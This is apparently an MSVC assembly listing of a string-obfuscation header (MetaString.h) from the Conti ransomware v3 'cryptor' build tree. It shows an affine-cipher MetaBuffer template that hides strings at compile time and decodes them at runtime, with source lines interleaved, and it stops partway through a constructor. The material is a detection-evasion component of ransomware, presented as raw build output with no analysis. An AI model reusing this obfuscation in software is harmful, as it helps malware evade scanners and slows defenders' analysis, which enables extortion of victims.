; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv210 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  002d5	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  002d9	88 85 c0 00 00
	00		 mov	 BYTE PTR tv210[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  002df	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  002e6	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  002ed	5f		 pop	 rdi
  002ee	5d		 pop	 rbp
  002ef	c3		 ret	 0
??0?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 63	 sub	 eax, 99			; 00000063H
  0002d	6b c0 dc	 imul	 eax, eax, -36		; ffffffffffffffdcH
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 43	 imul	 eax, eax, 67		; 00000043H
  0002d	83 c0 63	 add	 eax, 99			; 00000063H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 08	 cmp	 QWORD PTR i$1[rbp], 8
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ PROC ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ENDP ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv154 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
